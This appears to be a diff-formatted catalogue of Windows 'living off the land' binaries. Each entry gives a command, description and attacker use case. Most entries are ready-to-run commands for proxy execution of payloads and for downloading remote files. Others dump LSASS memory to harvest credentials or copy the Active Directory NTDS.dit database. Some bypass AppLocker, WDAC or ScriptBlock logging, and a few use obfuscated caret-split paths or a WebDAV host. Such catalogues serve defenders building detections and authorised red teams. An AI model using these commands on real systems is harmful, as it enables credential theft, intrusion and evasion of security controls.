+Name : msedge_proxy.exe
+Command : C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe {REMOTEURL:.zip}
+Description : msedge_proxy will download malicious file.
+Usecase : Download file from the internet
+                               
+Name : msedge_proxy.exe
+Command : C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe --disable-gpu-sandbox --gpu-launcher="{CMD} &&"
+Description : msedge_proxy.exe will execute file in the background
+Usecase : Executes a process under a trusted Microsoft signed binary
+                               
+Name : msedgewebview2.exe
+Command : msedgewebview2.exe --no-sandbox --browser-subprocess-path="{PATH_ABSOLUTE:.exe}"
+Description : This command launches the Microsoft Edge WebView2 browser control without sandboxing and will spawn the specified executable as its subprocess.
+Usecase : Proxy execution of binary
+                               
+Name : msedgewebview2.exe
+Command : msedgewebview2.exe --utility-cmd-prefix="{CMD}"
+Description : This command launches the Microsoft Edge WebView2 browser control without sandboxing and will spawn the specified command as its subprocess.
+Usecase : Proxy execution of binary
+                               
+Name : msedgewebview2.exe
+Command : msedgewebview2.exe --disable-gpu-sandbox --gpu-launcher="{CMD}"
+Description : This command launches the Microsoft Edge WebView2 browser control without sandboxing and will spawn the specified command as its subprocess.
+Usecase : Proxy execution of binary
+                               
+Name : msedgewebview2.exe
+Command : msedgewebview2.exe --no-sandbox --renderer-cmd-prefix="{CMD}"
+Description : This command launches the Microsoft Edge WebView2 browser control without sandboxing and will spawn the specified command as its subprocess.
+Usecase : Proxy execution of binary
+                               
+Name : wt.exe
+Command : wt.exe {CMD}
+Description : Execute a command via Windows Terminal.
+Usecase : Use wt.exe as a proxy binary to evade defensive counter-measures
+                               
+Name : Advpack.dll
+Command : rundll32.exe advpack.dll,LaunchINFSection {PATH:.inf},DefaultInstall_SingleUser,1,
+Description : Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified).
+Usecase : Run local or remote script(let) code through INF file specification.
+                               
+Name : Advpack.dll
+Command : rundll32.exe advpack.dll,LaunchINFSection {PATH:.inf},,1,
+Description : Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (DefaultInstall section implied).
+Usecase : Run local or remote script(let) code through INF file specification.
+                               
+Name : Advpack.dll
+Command : rundll32.exe advpack.dll,RegisterOCX {PATH:.dll}
+Description : Launch a DLL payload by calling the RegisterOCX function.
+Usecase : Load a DLL payload.
+                               
+Name : Advpack.dll
+Command : rundll32.exe advpack.dll,RegisterOCX {PATH:.exe}
+Description : Launch an executable by calling the RegisterOCX function.
+Usecase : Run an executable payload.
+                               
+Name : Advpack.dll
+Command : rundll32 advpack.dll, RegisterOCX {CMD}
+Description : Launch command line by calling the RegisterOCX function.
+Usecase : Run an executable payload.
+                               
+Name : Desk.cpl
+Command : rundll32.exe desk.cpl,InstallScreenSaver {PATH_ABSOLUTE:.scr}
+Description : Launch an executable with a .scr extension by calling the InstallScreenSaver function.
+Usecase : Launch any executable payload, as long as it uses the .scr extension.
+                               
+Name : Desk.cpl
+Command : rundll32.exe desk.cpl,InstallScreenSaver {PATH_SMB:.scr}
+Description : Launch a remote executable with a .scr extension, located on an SMB share, by calling the InstallScreenSaver function.
+Usecase : Launch any executable payload, as long as it uses the .scr extension.
+                               
+Name : Dfshim.dll
+Command : rundll32.exe dfshim.dll,ShOpenVerbApplication {REMOTEURL}
+Description : Executes click-once-application from URL (trampoline for Dfsvc.exe, DotNet ClickOnce host)
+Usecase : Use binary to bypass Application whitelisting
+                               
+Name : Ieadvpack.dll
+Command : rundll32.exe ieadvpack.dll,LaunchINFSection {PATH_ABSOLUTE:.inf},DefaultInstall_SingleUser,1,
+Description : Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified).
+Usecase : Run local or remote script(let) code through INF file specification.
+                               
+Name : Ieadvpack.dll
+Command : rundll32.exe ieadvpack.dll,LaunchINFSection {PATH_ABSOLUTE:.inf},,1,
+Description : Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (DefaultInstall section implied).
+Usecase : Run local or remote script(let) code through INF file specification.
+                               
+Name : Ieadvpack.dll
+Command : rundll32.exe ieadvpack.dll,RegisterOCX {PATH:.dll}
+Description : Launch a DLL payload by calling the RegisterOCX function.
+Usecase : Load a DLL payload.
+                               
+Name : Ieadvpack.dll
+Command : rundll32.exe ieadvpack.dll,RegisterOCX {PATH:.exe}
+Description : Launch an executable by calling the RegisterOCX function.
+Usecase : Run an executable payload.
+                               
+Name : Ieadvpack.dll
+Command : rundll32 ieadvpack.dll, RegisterOCX {CMD}
+Description : Launch command line by calling the RegisterOCX function.
+Usecase : Run an executable payload.
+                               
+Name : Ieframe.dll
+Command : rundll32.exe ieframe.dll,OpenURL {PATH_ABSOLUTE:.url}
+Description : Launch an executable payload via proxy through a(n) URL (information) file by calling OpenURL.
+Usecase : Load an executable payload by calling a .url file with or without quotes. The .url file extension can be renamed.
+                               
+Name : Mshtml.dll
+Command : rundll32.exe Mshtml.dll,PrintHTML {PATH_ABSOLUTE:.hta}
+Description : Invoke an HTML Application via mshta.exe (note: pops a security warning and a print dialogue box).
+Usecase : Launch an HTA application.
+                               
+Name : Pcwutl.dll
+Command : rundll32.exe pcwutl.dll,LaunchApplication {PATH:.exe}
+Description : Launch executable by calling the LaunchApplication function.
+Usecase : Launch an executable.
+                               
+Name : PhotoViewer.dll
+Command : rundll32.exe "C:\Program Files\Windows Photo Viewer\PhotoViewer.dll",ImageView_Fullscreen {REMOTEURL}
+Description : Once executed, rundll32.exe will download the file at the specified URL to the user's INetCache folder using the Windows Photo Viewer DLL.
+Usecase : Download file from remote location.
+                               
+Name : Scrobj.dll
+Command : rundll32.exe C:\Windows\System32\scrobj.dll,GenerateTypeLib {REMOTEURL:.exe}
+Description : Once executed, scrobj.dll attempts to load a file from the URL and saves it to INetCache.
+Usecase : Download file from remote location.
+                               
+Name : Setupapi.dll
+Command : rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 {PATH_ABSOLUTE:.inf}
+Description : Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified).
+Usecase : Run local or remote script(let) code through INF file specification.
+                               
+Name : Setupapi.dll
+Command : rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 {PATH_ABSOLUTE:.inf}
+Description : Launch an executable file via the InstallHinfSection function and .inf file section directive.
+Usecase : Load an executable payload.
+                               
+Name : Shdocvw.dll
+Command : rundll32.exe shdocvw.dll,OpenURL {PATH_ABSOLUTE:.url}
+Description : Launch an executable payload via proxy through a URL (information) file by calling OpenURL.
+Usecase : Load an executable payload by calling a .url file with or without quotes. The .url file extension can be renamed.
+                               
+Name : Shell32.dll
+Command : rundll32.exe shell32.dll,Control_RunDLL {PATH_ABSOLUTE:.dll}
+Description : Launch a DLL payload by calling the Control_RunDLL function.
+Usecase : Load a DLL payload.
+                               
+Name : Shell32.dll
+Command : rundll32.exe shell32.dll,ShellExec_RunDLL {PATH:.exe}
+Description : Launch an executable by calling the ShellExec_RunDLL function.
+Usecase : Run an executable payload.
+                               
+Name : Shell32.dll
+Command : rundll32 SHELL32.DLL,ShellExec_RunDLL {PATH:.exe} {CMD:args}
+Description : Launch command line by calling the ShellExec_RunDLL function.
+Usecase : Run an executable payload.
+                               
+Name : Shell32.dll
+Command : rundll32.exe shell32.dll,#44 {PATH:.dll}
+Description : Load a DLL/CPL by calling undocumented Control_RunDLLNoFallback function.
+Usecase : Load a DLL/CPL payload.
+                               
+Name : Shimgvw.dll
+Command : rundll32.exe c:\Windows\System32\shimgvw.dll,ImageView_Fullscreen {REMOTEURL:.exe}
+Description : Once executed, rundll32.exe will download the file at the URL in the command to INetCache. Can also be used with entrypoint 'ImageView_FullscreenA'.
+Usecase : Download file from remote location.
+                               
+Name : Syssetup.dll
+Command : rundll32 syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 {PATH_ABSOLUTE:.inf}
+Description : Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified).
+Usecase : Run local or remote script(let) code through INF file specification (Note May pop an error window).
+                               
+Name : Syssetup.dll
+Command : rundll32 syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 {PATH_ABSOLUTE:.inf}
+Description : Launch an executable file via the SetupInfObjectInstallAction function and .inf file section directive.
+Usecase : Load an executable payload.
+                               
+Name : Url.dll
+Command : rundll32.exe url.dll,OpenURL {PATH_ABSOLUTE:.hta}
+Description : Launch a HTML application payload by calling OpenURL.
+Usecase : Invoke an HTML Application via mshta.exe (Default Handler).
+                               
+Name : Url.dll
+Command : rundll32.exe url.dll,OpenURL {PATH_ABSOLUTE:.url}
+Description : Launch an executable payload via proxy through a .url (information) file by calling OpenURL.
+Usecase : Load an executable payload by calling a .url file.
+                               
+Name : Url.dll
+Command : rundll32.exe url.dll,OpenURL file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e
+Description : Launch an executable by calling OpenURL.
+Usecase : Load an executable payload by specifying the file protocol handler (obfuscated).
+                               
+Name : Url.dll
+Command : rundll32.exe url.dll,FileProtocolHandler {PATH_ABSOLUTE:.exe}
+Description : Launch an executable by calling FileProtocolHandler.
+Usecase : Launch an executable.
+                               
+Name : Url.dll
+Command : rundll32.exe url.dll,FileProtocolHandler file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e
+Description : Launch an executable by calling FileProtocolHandler.
+Usecase : Load an executable payload by specifying the file protocol handler (obfuscated).
+                               
+Name : Url.dll
+Command : rundll32.exe url.dll,FileProtocolHandler file:///C:/test/test.hta
+Description : Launch a HTML application payload by calling FileProtocolHandler.
+Usecase : Invoke an HTML Application via mshta.exe (Default Handler).
+                               
+Name : Zipfldr.dll
+Command : rundll32.exe zipfldr.dll,RouteTheCall {PATH:.exe}
+Description : Launch an executable payload by calling RouteTheCall.
+Usecase : Launch an executable.
+                               
+Name : Zipfldr.dll
+Command : rundll32.exe zipfldr.dll,RouteTheCall file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e
+Description : Launch an executable payload by calling RouteTheCall (obfuscated).
+Usecase : Launch an executable.
+                               
+Name : Comsvcs.dll
+Command : rundll32 C:\windows\system32\comsvcs.dll MiniDump {LSASS_PID} dump.bin full
+Description : Calls the MiniDump exported function of comsvcs.dll, which in turns calls MiniDumpWriteDump.
+Usecase : Dump Lsass.exe process memory to retrieve credentials.
+                               
+Name : AccCheckConsole.exe
+Command : AccCheckConsole.exe -window "Untitled - Notepad" {PATH_ABSOLUTE:.dll}
+Description : Load a managed DLL in the context of AccCheckConsole.exe. The -window switch value can be set to an arbitrary active window name.
+Usecase : Local execution of managed code from assembly DLL.
+                               
+Name : AccCheckConsole.exe
+Command : AccCheckConsole.exe -window "Untitled - Notepad" {PATH_ABSOLUTE:.dll}
+Description : Load a managed DLL in the context of AccCheckConsole.exe. The -window switch value can be set to an arbitrary active window name.
+Usecase : Local execution of managed code to bypass AppLocker.
+                               
+Name : adplus.exe
+Command : adplus.exe -hang -pn lsass.exe -o {PATH_ABSOLUTE:folder} -quiet
+Description : Creates a memory dump of the lsass process
+Usecase : Create memory dump and parse it offline
+                               
+Name : adplus.exe
+Command : adplus.exe -c {PATH:.xml}
+Description : Execute arbitrary commands using adplus config file (see Resources section for a sample file).
+Usecase : Run commands under a trusted Microsoft signed binary
+                               
+Name : adplus.exe
+Command : adplus.exe -c {PATH:.xml}
+Description : Dump process memory using adplus config file (see Resources section for a sample file).
+Usecase : Run commands under a trusted Microsoft signed binary
+                               
+Name : adplus.exe
+Command : adplus.exe -crash -o "{PATH_ABSOLUTE:folder}" -sc {PATH:.exe}
+Description : Execute arbitrary commands and binaries from the context of adplus. Note that providing an output directory via '-o' is required.
+Usecase : Run commands under a trusted Microsoft signed binary
+                               
+Name : AgentExecutor.exe
+Command : AgentExecutor.exe -powershell "{PATH_ABSOLUTE:.ps1}" "{PATH_ABSOLUTE:.1.log}" "{PATH_ABSOLUTE:.2.log}" "{PATH_ABSOLUTE:.3.log}" 60000 "C:\Windows\SysWOW64\WindowsPowerShell\v1.0" 0 1
+Description : Spawns powershell.exe and executes a provided powershell script with ExecutionPolicy Bypass argument
+Usecase : Execute unsigned powershell scripts
+                               
+Name : AgentExecutor.exe
+Command : AgentExecutor.exe -powershell "{PATH_ABSOLUTE:.ps1}" "{PATH_ABSOLUTE:.1.log}" "{PATH_ABSOLUTE:.2.log}" "{PATH_ABSOLUTE:.3.log}" 60000 "{PATH_ABSOLUTE:folder}" 0 1
+Description : If we place a binary named powershell.exe in the specified folder path, agentexecutor.exe will execute it successfully
+Usecase : Execute a provided EXE
+                               
+Name : AppLauncher.exe
+Command : AppLauncher.exe {PATH_ABSOLUTE:.exe}
+Description : Launches an executable via User Experience Virtualization tool.
+Usecase : Executes an executable under a trusted, Microsoft signed binary.
+                               
+Name : AppCert.exe
+Command : appcert.exe test -apptype desktop -setuppath {PATH_ABSOLUTE:.exe} -reportoutputpath {PATH_ABSOLUTE:.xml}
+Description : Execute an executable file via the Windows App Certification Kit command-line tool.
+Usecase : Performs execution of specified file, can be used as a defense evasion
+                               
+Name : AppCert.exe
+Command : appcert.exe test -apptype desktop -setuppath {PATH_ABSOLUTE:.msi} -setupcommandline /q -reportoutputpath {PATH_ABSOLUTE:.xml}
+Description : Install an MSI file via an msiexec instance spawned via appcert.exe as parent process.
+Usecase : Execute custom made MSI file with malicious code
+                               
+Name : Appvlp.exe
+Command : AppVLP.exe {PATH_SMB:.bat}
+Description : Executes .bat file through AppVLP.exe
+Usecase : Execution of BAT file hosted on Webdav server.
+                               
+Name : Appvlp.exe
+Command : AppVLP.exe powershell.exe -c "$e=New-Object -ComObject shell.application;$e.ShellExecute('{PATH:.exe}','', '', 'open', 1)"
+Description : Executes powershell.exe as a subprocess of AppVLP.exe and run the respective PS command.
+Usecase : Local execution of process bypassing Attack Surface Reduction (ASR).
+                               
+Name : Bginfo.exe
+Command : bginfo.exe {PATH:.bgi} /popup /nolicprompt
+Description : Execute VBscript code that is referenced within the specified .bgi file.
+Usecase : Local execution of VBScript
+                               
+Name : Bginfo.exe
+Command : bginfo.exe {PATH:.bgi} /popup /nolicprompt
+Description : Execute VBscript code that is referenced within the specified .bgi file.
+Usecase : Local execution of VBScript
+                               
+Name : Bginfo.exe
+Command : \\10.10.10.10\webdav\bginfo.exe {PATH:.bgi} /popup /nolicprompt
+Description : Execute bginfo.exe from a WebDAV server.
+Usecase : Remote execution of VBScript
+                               
+Name : Bginfo.exe
+Command : \\10.10.10.10\webdav\bginfo.exe {PATH:.bgi} /popup /nolicprompt
+Description : Execute bginfo.exe from a WebDAV server.
+Usecase : Remote execution of VBScript
+                               
+Name : Bginfo.exe
+Command : \\live.sysinternals.com\Tools\bginfo.exe {PATH_SMB:.bgi} /popup /nolicprompt
+Description : This style of execution may not longer work due to patch.
+Usecase : Remote execution of VBScript
+                               
+Name : Bginfo.exe
+Command : \\live.sysinternals.com\Tools\bginfo.exe {PATH_SMB:.bgi} /popup /nolicprompt
+Description : This style of execution may not longer work due to patch.
+Usecase : Remote execution of VBScript
+                               
+Name : Cdb.exe
+Command : cdb.exe -cf {PATH:.wds} -o notepad.exe
+Description : Launch 64-bit shellcode from the specified .wds file using cdb.exe.
+Usecase : Local execution of assembly shellcode.
+                               
+Name : Cdb.exe
+Command : cdb.exe -pd -pn {process_name}
+.shell {CMD}
+
+Description : Attaching to any process and executing shell commands.
+Usecase : Run a shell command under a trusted Microsoft signed binary
+                               
+Name : Cdb.exe
+Command : cdb.exe -c {PATH:.txt} "{CMD}"
+Description : Execute arbitrary commands and binaries using a debugging script (see Resources section for a sample file).
+Usecase : Run commands under a trusted Microsoft signed binary
+                               
+Name : coregen.exe
+Command : coregen.exe /L {PATH_ABSOLUTE:.dll} dummy_assembly_name
+Description : Loads the target .DLL in arbitrary path specified with /L.
+Usecase : Execute DLL code
+                               
+Name : coregen.exe
+Command : coregen.exe dummy_assembly_name
+Description : Loads the coreclr.dll in the corgen.exe directory (e.g. C:\Program Files\Microsoft Silverlight\5.1.50918.0).
+Usecase : Execute DLL code
+                               
+Name : coregen.exe
+Command : coregen.exe /L {PATH_ABSOLUTE:.dll} dummy_assembly_name
+Description : Loads the target .DLL in arbitrary path specified with /L. Since binary is signed it can also be used to bypass application whitelisting solutions.
+Usecase : Execute DLL code
+                               
+Name : Createdump.exe
+Command : createdump.exe -n -f {PATH:.dmp} {PID}
+Description : Dump process by PID and create a minidump file. If "-f dump.dmp" is not specified, the file is created as '%TEMP%\dump.%p.dmp' where %p is the PID of the target process.
+Usecase : Dump process memory contents using PID.
+                               
+Name : csi.exe
+Command : csi.exe {PATH:.cs}
+Description : Use csi.exe to run unsigned C# code.
+Usecase : Local execution of unsigned C# code.
+                               
+Name : DefaultPack.EXE
+Command : DefaultPack.EXE /C:"{CMD}"
+Description : Use DefaultPack.EXE to execute arbitrary binaries, with added argument support.
+Usecase : Can be used to execute stagers, binaries, and other malicious commands.
+                               
+Name : Devinit.exe
+Command : devinit.exe run -t msi-install -i {REMOTEURL:.msi}
+Description : Downloads an MSI file to C:\Windows\Installer and then installs it.
+Usecase : Executes code from a (remote) MSI file.
+                               
+Name : Devtoolslauncher.exe
+Command : devtoolslauncher.exe LaunchForDeploy {PATH_ABSOLUTE:.exe} "{CMD:args}" test
+Description : The above binary will execute other binary.
+Usecase : Execute any binary with given arguments and it will call developertoolssvc.exe. developertoolssvc is actually executing the binary.
+                               
+Name : Devtoolslauncher.exe
+Command : devtoolslauncher.exe LaunchForDebug {PATH_ABSOLUTE:.exe} "{CMD:args}" test
+Description : The above binary will execute other binary.
+Usecase : Execute any binary with given arguments.
+                               
+Name : dnx.exe
+Command : dnx.exe {PATH_ABSOLUTE:folder}
+Description : Execute C# code located in the specified folder via 'Program.cs' and 'Project.json' (Note - Requires dependencies)
+Usecase : Local execution of C# project stored in consoleapp folder.
+                               
+Name : Dotnet.exe
+Command : dotnet.exe {PATH:.dll}
+Description : dotnet.exe will execute any DLL even if applocker is enabled.
+Usecase : Execute code bypassing AWL
+                               
+Name : Dotnet.exe
+Command : dotnet.exe {PATH:.dll}
+Description : dotnet.exe will execute any DLL.
+Usecase : Execute DLL
+                               
+Name : Dotnet.exe
+Command : dotnet.exe fsi
+Description : dotnet.exe will open a console which allows for the execution of arbitrary F# commands
+Usecase : Execute arbitrary F# code
+                               
+Name : Dotnet.exe
+Command : dotnet.exe msbuild {PATH:.csproj}
+Description : dotnet.exe with msbuild (SDK Version) will execute unsigned code
+Usecase : Execute code bypassing AWL
+                               
+Name : dsdbutil.exe
+Command : dsdbutil.exe "activate instance ntds" "snapshot" "create" "quit" "quit"
+Description : dsdbutil supports VSS snapshot creation
+Usecase : Snapshoting of Active Directory NTDS.dit database
+                               
+Name : dsdbutil.exe
+Command : dsdbutil.exe "activate instance ntds" "snapshot" "mount {GUID}" "quit" "quit"
+Description : Mounting the snapshot with its GUID
+Usecase : Mounting the snapshot to access the ntds.dit with `copy c:\<Snap Volume>\windows\ntds\ntds.dit c:\users\administrator\desktop\ntds.dit.bak`
+                               
+Name : dsdbutil.exe
+Command : dsdbutil.exe "activate instance ntds" "snapshot" "delete {GUID}" "quit" "quit"
+Description : Deletes the mount of the snapshot
+Usecase : Deletes the snapshot
+                               
+Name : dsdbutil.exe
+Command : dsdbutil.exe "activate instance ntds" "snapshot" "create" "list all" "mount 1" "quit" "quit"
+Description : Mounting with snapshot identifier
+Usecase : Mounting the snapshot identifier 1 and accessing it with `copy c:\<Snap Volume>\windows\ntds\ntds.dit c:\users\administrator\desktop\ntds.dit.bak`
+                               
+Name : dsdbutil.exe
+Command : dsdbutil.exe "activate instance ntds" "snapshot" "list all" "delete 1" "quit" "quit"
+Description : Deletes the mount of the snapshot
+Usecase : deletes the snapshot
+                               
+Name : dtutil.exe
+Command : dtutil.exe /FILE {PATH_ABSOLUTE:.source.ext} /COPY FILE;{PATH_ABSOLUTE:.dest.ext}
+Description : Copy file from source to destination
+Usecase : Use to copies the source file to the destination file
+                               
+Name : Dump64.exe
+Command : dump64.exe {PID} out.dmp
+Description : Creates a memory dump of the LSASS process.
+Usecase : Create memory dump and parse it offline to retrieve credentials.
+                               
+Name : DumpMinitool.exe
+Command : DumpMinitool.exe --file {PATH_ABSOLUTE} --processId 1132 --dumpType Full
+Description : Creates a memory dump of the lsass process
+Usecase : Create memory dump and parse it offline
+                               
+Name : Dxcap.exe
+Command : Dxcap.exe -c {PATH_ABSOLUTE:.exe}
+Description : Launch specified executable as a subprocess of dxcap.exe. Note that you should have write permissions in the current working directory for the command to succeed; alternatively, add '-file c:\path\to\writable\location.ext' as first argument.
+Usecase : Local execution of a process as a subprocess of dxcap.exe
+                               
+Name : ECMangen.exe
+Command : ECMangen.exe {REMOTEURL}
+Description : Downloads payload from remote server
+Usecase : It will download a remote payload and place it in INetCache
+                               
+Name : Excel.exe
+Command : Excel.exe {REMOTEURL}
+Description : Downloads payload from remote server
+Usecase : It will download a remote payload and place it in INetCache.
+                               
+Name : Fsi.exe
+Command : fsi.exe {PATH:.fsscript}
+Description : Execute F# code via script file
+Usecase : Execute payload with Microsoft signed binary to bypass WDAC policies
+                               
+Name : Fsi.exe
+Command : fsi.exe
+Description : Execute F# code via interactive command line
+Usecase : Execute payload with Microsoft signed binary to bypass WDAC policies
+                               
+Name : FsiAnyCpu.exe
+Command : fsianycpu.exe {PATH:.fsscript}
+Description : Execute F# code via script file
+Usecase : Execute payload with Microsoft signed binary to bypass WDAC policies
+                               
+Name : FsiAnyCpu.exe
+Command : fsianycpu.exe
+Description : Execute F# code via interactive command line
+Usecase : Execute payload with Microsoft signed binary to bypass WDAC policies
+                               
+Name : Mftrace.exe
+Command : Mftrace.exe {PATH:.exe}
+Description : Launch specified executable as a subprocess of Mftrace.exe.
+Usecase : Local execution of cmd.exe as a subprocess of Mftrace.exe.
+                               
+Name : Microsoft.NodejsTools.PressAnyKey.exe
+Command : Microsoft.NodejsTools.PressAnyKey.exe normal 1 {PATH:.exe}
+Description : Launch specified executable as a subprocess of Microsoft.NodejsTools.PressAnyKey.exe.
+Usecase : Spawn a new process via Microsoft.NodejsTools.PressAnyKey.exe.
+                               
+Name : Mpiexec.exe
+Command : mpiexec.exe {CMD}
+Description : Executes a command via MPI command-line tool.
+Usecase : Executes commands under a trusted, Microsoft signed binary.
+                               
+Name : MSAccess.exe
+Command : MSAccess.exe {REMOTEURL}
+Description : Downloads payload from remote server
+Usecase : It will download a remote payload (if it has the filename extension .mdb) and place it in INetCache.
+                               
+Name : Msdeploy.exe
+Command : msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand="{PATH_ABSOLUTE:.bat}"
+Description : Launch .bat file via msdeploy.exe.
+Usecase : Local execution of batch file using msdeploy.exe.
+                               
+Name : Msdeploy.exe
+Command : msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand="{PATH_ABSOLUTE:.bat}"
+Description : Launch .bat file via msdeploy.exe.
+Usecase : Local execution of batch file using msdeploy.exe.
+                               
+Name : Msdeploy.exe
+Command : msdeploy.exe -verb:sync -source:filePath={PATH_ABSOLUTE:.source.ext} -dest:filePath={PATH_ABSOLUTE:.dest.ext}
+Description : Copy file from source to destination.
+Usecase : Copy file.
+                               
+Name : MsoHtmEd.exe
+Command : MsoHtmEd.exe {REMOTEURL}
+Description : Downloads payload from remote server
+Usecase : It will download a remote payload and place it in INetCache.
+                               
+Name : Mspub.exe
+Command : mspub.exe {REMOTEURL}
+Description : Downloads payload from remote server
+Usecase : It will download a remote payload and place it in INetCache.
+                               
+Name : msxsl.exe
+Command : msxsl.exe {PATH:.xml} {PATH:.xsl}
+Description : Run COM Scriptlet code within the script.xsl file (local).
+Usecase : Local execution of script stored in XSL file.
+                               
+Name : msxsl.exe
+Command : msxsl.exe {PATH:.xml} {PATH:.xsl}
+Description : Run COM Scriptlet code within the script.xsl file (local).
+Usecase : Local execution of script stored in XSL file.
+                               
+Name : msxsl.exe
+Command : msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl}
+Description : Run COM Scriptlet code within the shellcode.xml(xsl) file (remote).
+Usecase : Local execution of remote script stored in XSL script stored as an XML file.
+                               
+Name : msxsl.exe
+Command : msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xml}
+Description : Run COM Scriptlet code within the shellcode.xml(xsl) file (remote).
+Usecase : Local execution of remote script stored in XSL script stored as an XML file.
+                               
+Name : msxsl.exe
+Command : msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl} -o {PATH}
+Description : Using remote XML and XSL files, save the transformed XML file to disk.
+Usecase : Download a file from the internet and save it to disk.
+                               
+Name : msxsl.exe
+Command : msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl} -o {PATH}:ads-name
+Description : Using remote XML and XSL files, save the transformed XML file to an Alternate Data Stream (ADS).
+Usecase : Download a file from the internet and save it to an NTFS Alternate Data Stream.
+                               
+Name : ntdsutil.exe
+Command : ntdsutil.exe "ac i ntds" "ifm" "create full c:\" q q
+Description : Dump NTDS.dit into folder
+Usecase : Dumping of Active Directory NTDS.dit database
+                               
+Name : Ntsd.exe
+Command : ntsd.exe -g {CMD}
+Description : Launches command through the debugging process; optionally add `-G` to exit the debugger automatically.
+Usecase : Executes an executable under a trusted microsoft signed binary.
+                               
+Name : OpenConsole.exe
+Command : OpenConsole.exe {PATH:.exe}
+Description : Execute specified process with OpenConsole.exe as parent process
+Usecase : Use OpenConsole.exe as a proxy binary to evade defensive counter-measures
+                               
+Name : Pixtool.exe
+Command : pixtool.exe launch {PATH_ABSOLUTE:.exe}
+Description : Launches an executable via PIX command-line utility.
+Usecase : Executes an executable under a trusted, Microsoft signed binary.
+                               
+Name : Powerpnt.exe
+Command : Powerpnt.exe {REMOTEURL}
+Description : Downloads payload from remote server
+Usecase : It will download a remote payload and place it in INetCache.
+                               
+Name : Procdump.exe
+Command : procdump.exe -md {PATH:.dll} explorer.exe
+Description : Loads the specified DLL where DLL is configured with a 'MiniDumpCallbackRoutine' exported function. Valid process must be provided as dump still created.
+Usecase : Performs execution of unsigned DLL.
+                               
+Name : Procdump.exe
+Command : procdump.exe -md {PATH:.dll} foobar
+Description : Loads the specified DLL where configured with DLL_PROCESS_ATTACH execution, process argument can be arbitrary.
+Usecase : Performs execution of unsigned DLL.
+                               
+Name : ProtocolHandler.exe
+Command : ProtocolHandler.exe {REMOTEURL}
+Description : Downloads payload from remote server
+Usecase : It will open the specified URL in the default web browser, which (if the URL points to a file) will often result in the file being downloaded to the user's Downloads folder (without user interaction)
+                               
+Name : rcsi.exe
+Command : rcsi.exe {PATH:.csx}
+Description : Use embedded C# within the csx script to execute the code.
+Usecase : Local execution of arbitrary C# code stored in local CSX file.
+                               
+Name : rcsi.exe
+Command : rcsi.exe {PATH:.csx}
+Description : Use embedded C# within the csx script to execute the code.
+Usecase : Local execution of arbitrary C# code stored in local CSX file.
+                               
+Name : Remote.exe
+Command : Remote.exe /s {PATH:.exe} anythinghere
+Description : Spawns specified executable as a child process of remote.exe
+Usecase : Executes a process under a trusted Microsoft signed binary
+                               
+Name : Remote.exe
+Command : Remote.exe /s {PATH:.exe} anythinghere
+Description : Spawns specified executable as a child process of remote.exe
+Usecase : Executes a process under a trusted Microsoft signed binary
+                               
+Name : Remote.exe
+Command : Remote.exe /s {PATH_SMB:.exe} anythinghere
+Description : Run a remote file
+Usecase : Executing a remote binary without saving file to disk
+                               
+Name : Sqldumper.exe
+Command : sqldumper.exe 464 0 0x0110
+Description : Dump process by PID and create a dump file (Appears to create a dump file called SQLDmprXXXX.mdmp).
+Usecase : Dump process using PID.
+                               
+Name : Sqldumper.exe
+Command : sqldumper.exe 540 0 0x01100:40
+Description : 0x01100:40 flag will create a Mimikatz compatible dump file.
+Usecase : Dump LSASS.exe to Mimikatz compatible dump using PID.
+                               
+Name : Sqlps.exe
+Command : Sqlps.exe -noprofile
+Description : Run a SQL Server PowerShell mini-console without Module and ScriptBlock Logging.
+Usecase : Execute PowerShell commands without ScriptBlock logging.
+                               
+Name : SQLToolsPS.exe
+Command : SQLToolsPS.exe -noprofile -command Start-Process {PATH:.exe}
+Description : Run a SQL Server PowerShell mini-console without Module and ScriptBlock Logging.
+Usecase : Execute PowerShell command.
+                               
+Name : Squirrel.exe
+Command : squirrel.exe --download {REMOTEURL}
+Description : The above binary will go to url and look for RELEASES file and download the nuget package.
+Usecase : Download binary
+                               
+Name : Squirrel.exe
+Command : squirrel.exe --update {REMOTEURL}
+Description : The above binary will go to url and look for RELEASES file, download and install the nuget package.
+Usecase : Download and execute binary
+                               
+Name : Squirrel.exe
+Command : squirrel.exe --update {REMOTEURL}
+Description : The above binary will go to url and look for RELEASES file, download and install the nuget package.
+Usecase : Download and execute binary
+                               
+Name : Squirrel.exe
+Command : squirrel.exe --updateRollback={REMOTEURL}
+Description : The above binary will go to url and look for RELEASES file, download and install the nuget package.
+Usecase : Download and execute binary
+                               
+Name : Squirrel.exe
+Command : squirrel.exe --updateRollback={REMOTEURL}
+Description : The above binary will go to url and look for RELEASES file, download and install the nuget package.
+Usecase : Download and execute binary
+                               
+Name : te.exe
+Command : te.exe {PATH:.wsc}
+Description : Run COM Scriptlets (e.g. VBScript) by calling a Windows Script Component (WSC) file.
+Usecase : Execute Visual Basic script stored in local Windows Script Component file.
+                               
+Name : te.exe
+Command : te.exe {PATH:.dll}
+Description : Execute commands from a DLL file with Test Authoring and Execution Framework (TAEF) tests. See resources section for required structures.
+Usecase : Execute DLL file.
+                               
+Name : Teams.exe
+Command : teams.exe
